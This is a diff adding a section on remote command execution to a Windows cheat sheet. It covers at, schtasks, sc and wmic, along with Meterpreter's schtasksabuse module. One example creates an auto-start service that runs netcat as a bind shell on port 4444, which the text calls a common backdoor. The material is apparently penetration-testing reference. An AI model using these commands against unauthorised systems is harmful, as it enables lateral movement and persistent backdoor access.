@@ -19,6 +19,7 @@
 - [For Each Loop](./README.md#for-each-loop)
 - [Batch File Vars](./README.md#batch-file-vars)
 - [Command Line Args](./README.md#command-line-args)
+- [Running Remote Commands (psexec)](./README.md#running-remote-commands-psexec)
 
 _Linux, Bash, & Python examples for comparison._
 
@@ -534,3 +535,91 @@ msf > SMBPass [hash]
 
 Note: Pivoting via `psexec` minimizes unintended crashes etc.
 
+**Other methods of running remote commands involve task scheduling, see next **
+
+---
+
+### Scheduling Jobs ###
+In Windows, task scheduling is one of the _"most common methods"_ to run remote commands ... probably because the lack of naitive SSH *cough cough*. The advantage of this method over `psexec` is that all executables are included by default in the operating system.
+
+Pre-requisits:
+- SMB session required `net use \\[remote_ip] /u:[username] [password]`
+- Verify "Schedule" service is running `sc \\[remote_ip] query schedule`
+- Start "Schedule" service if not already running `sc \\[remote_ip] start schedule`
+- Verify  sstem time of remote system is correct`net time \\[remote_ip]`
+ 
+#### `at` command ####
+Only able to run as local `SYSTEM` user.
+Some Windows operating systems support the 24HR time format.
+```
+C:\> at \\[remote_ip] [HH:MM][A|P] [command]
+```
+Verify job has started with the command `at \\[remote_ip]`.
+ 
+ 
+#### `schtasks` command ####
+Only able to run as local `SYSTEM` user.
+Some Windows operating systems support the 24HR time format.
+Start Time must be in `HH:MM:SS` format.
+Start Date must be in `MM/DD/YYYY` format?
+Frequency must one of the following `MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE`.
+Task Name is important so we can `sc query` it for status.
+```
+C:\> schtasks /create /tn [taskname] /s [remote_ip] /u [username] /p [password] /sc [frequency] /st [start_time] /sd [start_date] /tr [command]
+```
+Verify job has started with the command `schtasks /query /s [remote_ip]`.
+
+Meterpreter includes a module called `schtasksabuse` that simplifies a lot of the `schtasks` process. If no credentials are given, `schtasksabuse` will run as the user who owns the process that _hosts_ meterpreter.
+```
+meterpreter > run schtasksabuse -c "[command_1],[command_2]" -t [remote_ip] -u [username] -p [password]
+```
+ 
+ 
+#### `sc` command ####
+Starts the command as a service. _see limitation notes below_.
+The space between `binpath= ` and the `[command]` is intentional and is required syntax. Wtf?
+```
+C:\> sc \\[remote_ip] create [service_name] binpath= "[command] [-flag] [arg]"
+```
+Next we will have to start the process with `sc \\[remote_ip] start [service_name]`, skip this step by adding `start= auto` when creating the service.
+
+A (severe) limitation is that the service will only live for 30 seconds, this is because the service doesn't callback to `sc` letting it know that the service started; wtb `exit 0`. 
+Working around this can be done by the following:
+- (hack) Use `sc` to start a `cmd.exe` which then invokes another command, whatever we spawn will outlive the 30 second window.
+- (bad)  Use a program to wrap an executable so that it throws the API call indicating a successful service start. See (ServifyThis)[https://github.com/inguardians/ServifyThis].
+
+An example of the former:
+```
+C:\> sc \\[remote_ip] create netcat binpath= "cmd.exe /k c:\path\to\nc.exe -L -p 4444 -e cmd.exe" start= auto
+```
+This creates a service called `netcat` which starts `cmd.exe /k` to run another command which is `nc.exe`; That'll listens on port 4444 and when it detects an inbound connection it'll `-e` execute `cmd.exe` back through the netcat session. This is a common backdoor shell, see (netcat-utils)[https://github.com/cjwaian/netcat-utils]. 
+
+Remove service with `sc \\[remote_ip] delete [service_name].
+
+ 
+ 
+#### `wmic` command ####
+The Windows Management Instrumentation (WMI) framework.
+Does not require a SMB session?
+By default it will run on a local system but by invoking `/node:[remote_ip]` it will execute on a remote system. 
+Specify credentials with `/user:[username] /password:[password]`.
+If no credentials are provided WMIC will pass throught the existing user credentials for authenticating to that remote system, _pass-the-hash_?
+To run against multiple remote systems, first create a `.txt` file with the machine name or IP Adrress on each line, then use `/node:@[filename.txt]`. WMIC will iterate through the file executing on each remote system.
+```
+C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process call create [command]
+```
+
+List processes on a remote system.
+```
+C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process list brief
+```
+
+Kill a process by `PID`
+```
+C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process where processid="[PID]" delete
+```
+
+Kill process by `service_name`.
+```
+C:\> wmic /node:[remote_ip] /user:[username] /password:[password] process where name="[service_name]" delete
+```
